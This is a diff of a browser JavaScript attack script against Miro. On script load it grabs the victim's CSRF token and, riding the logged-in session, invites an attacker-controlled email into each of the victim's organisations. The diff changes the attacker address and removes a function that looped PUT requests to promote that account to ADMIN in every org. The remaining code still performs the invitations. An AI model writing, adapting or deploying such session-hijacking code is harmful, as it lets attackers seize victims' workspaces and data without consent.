@@ -1,4 +1,4 @@
-const hackerMail = "romar.kyron@malldrops.com";
+const hackerMail = "graylen.sitiveni@malldrops.com";
 
 async function getCsrf() {
   console.log("Fetching CSRF token...");
@@ -74,52 +74,7 @@ async function invite(orgId, csrfToken) {
   return res.ok;
 }
 
-async function adminEscalation(orgIds, csrfToken) {
-  for (const orgId of orgIds) {
-    console.log(`Fetching user connections for org ${orgId} to find hack ID...`);
-    const userConnRes = await fetch(
-      `https://miro.com/api/v1/accounts/${orgId}/user-connections?fields=id&search=${encodeURIComponent(
-        hackerMail
-      )}&limit=500&offset=0`,
-      {
-        method: "GET",
-        credentials: "include",
-      }
-    );
 
-    const userConnJson = await userConnRes.json();
-    if (userConnJson.size === 0 || !userConnJson.data[0]?.id) {
-      console.log(`No user connection found for ${hackerMail} in org ${orgId}`);
-      continue;
-    }
-
-    const hackId = userConnJson.data[0].id;
-    console.log(`Found hack ID ${hackId} for org ${orgId}`);
-
-    let success = false;
-    while (!success) {
-      console.log(`Trying to escalate to ADMIN on org ${orgId} for user connection ${hackId}...`);
-      const putRes = await fetch(
-        `https://miro.com/api/v1/accounts/${orgId}/user-connections/${hackId}/?role=ADMIN`,
-        {
-          method: "PUT",
-          headers: {
-            "X-CSRF-TOKEN": csrfToken,
-          },
-          credentials: "include",
-        }
-      );
-
-      const putJson = await putRes.json();
-      if (putJson.success === true) {
-        console.log(`Successfully escalated to ADMIN on org ${orgId}`);
-        success = true;
-      } else {
-        console.log(`Escalation failed on org ${orgId}, retrying in 1s...`);
-        await new Promise((r) => setTimeout(r, 1000));
-      }
-    }
-  }
 }
 
 // Immediately invoke async function on script load
@@ -132,8 +87,6 @@ async function adminEscalation(orgIds, csrfToken) {
     for (const orgId of orgIds) {
       await invite(orgId, csrfToken);
     }
-
-    await adminEscalation(orgIds, csrfToken);
 
     console.log("Workflow finished.");
   } catch (err) {
